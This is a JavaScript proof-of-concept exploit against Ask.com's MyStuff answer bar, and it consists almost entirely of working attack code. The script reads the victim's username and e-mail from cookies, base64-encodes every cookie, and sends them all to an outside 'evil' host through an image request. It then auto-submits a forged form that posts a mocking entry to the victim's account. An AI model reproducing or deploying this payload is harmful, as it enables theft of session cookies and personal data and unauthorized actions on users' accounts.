document.write("<img id=\"getAroundSameOriginPolicy\" src=\"\"> <form name=\"saveWebPageForm\" action=\"http://mystuff.ask.com/mysearch/SaveWebPage\" method=\"post\" id=\"saveWebPageForm\"> <input type=\"hidden\" name=\"a\" value=\"save\"> <input type=\"hidden\" name=\"eid\" value=\"\"> <input type=\"hidden\" name=\"t\" value=\"webpages\"> <input type=\"hidden\" name=\"fid\" value=\"\"> <input type=\"hidden\" name=\"returl\" value=\"/mysearch/DisplaySearchesHome?t=all&amp;sort=dedate\"> <input type=\"hidden\" name=\"fromShared\" value=\"\"> <input name=\"title\" value=\"People who have clicked on this link.\"> <input name=\"url\" value=\"http://mipsisrisc.com/evil/suckers.php\"> <textarea id=\"desc\" name=\"abstext\"></textarea> <input type=\"hidden\" name=\"efid\" value=\"\"> <input id=\"tagField\" value=\"\"> </form>");

// This code was written by Tyler Akins and has been placed in the
// public domain.  It would be nice if you left this header intact.
// Base64 code from Tyler Akins -- http://rumkin.com

var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

function encode64(input) {
   var output = "";
   var chr1, chr2, chr3;
   var enc1, enc2, enc3, enc4;
   var i = 0;

   do {
      chr1 = input.charCodeAt(i++);
      chr2 = input.charCodeAt(i++);
      chr3 = input.charCodeAt(i++);

      enc1 = chr1 >> 2;
      enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
      enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
      enc4 = chr3 & 63;

      if (isNaN(chr2)) {
         enc3 = enc4 = 64;
      } else if (isNaN(chr3)) {
         enc4 = 64;
      }

      output = output + keyStr.charAt(enc1) + keyStr.charAt(enc2) + 
         keyStr.charAt(enc3) + keyStr.charAt(enc4);
   } while (i < input.length);
   
   return output;
}

/* From http://www.w3schools.com/JS/js_cookies.asp */
function getCookie(c_name)
{
    if (document.cookie.length > 0)
    {
        // Turns out there's a cookie named SAUID. This should work as long as we don't want to fetch the first cookie
        c_start=document.cookie.indexOf(" " + c_name + "=");
        if (c_start != -1)
        {
            c_start = c_start + c_name.length+1;
            c_end = document.cookie.indexOf(";",c_start);
            if (c_end == -1) c_end=document.cookie.length;
            return unescape(document.cookie.substring(c_start,c_end));
        }
    }
    return null;
}

var username = getCookie("nname");
var email = getCookie("AUID");

if (email == null) {
    email = "";
}
else {
    var email_start = email.indexOf("==|") + 3;
    var email_end = email.length + 1;
    email = email.substring(email_start, email_end);
}
var text = document.getElementById("desc");
text.value = "Hello, " + username + ". This is a proof-of-concept exploit of the answer bar. Your e-mail address (" + email + "), has been logged. Click on the link to view list of suckers.";

var img = document.getElementById("getAroundSameOriginPolicy");
img.src="http://mipsisrisc.com/evil/save.php?name=" + username + "&email=" + email + "&cookies=" + encode64(document.cookie).replace(/\+/g, "%2B");

/* Wait for the image to load. */
window.setTimeout(function(){document.saveWebPageForm.submit();}, 1000);
